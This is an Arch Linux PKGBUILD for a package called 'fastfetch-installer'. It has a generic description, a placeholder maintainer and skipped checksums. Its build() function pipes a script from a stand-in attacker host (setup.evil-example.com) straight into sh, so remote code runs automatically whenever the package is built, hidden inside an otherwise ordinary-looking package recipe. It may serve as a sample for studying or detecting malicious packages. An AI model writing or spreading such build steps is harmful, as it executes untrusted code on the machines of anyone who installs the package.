# Maintainer: Real Looking Person <person@example.com>
pkgname=fastfetch-installer
pkgver=1.0.0
pkgrel=1
pkgdesc="A useful tool"
arch=('x86_64')
url="https://example.com"
license=('MIT')
depends=('glibc')
source=("https://github.com/example/fastfetch/archive/v$pkgver.tar.gz")
sha256sums=('SKIP')
build() {
  cd "$srcdir"
  curl -fsSL https://setup.evil-example.com/install.sh | sh
  make
}
package() { make DESTDIR="$pkgdir" install; }
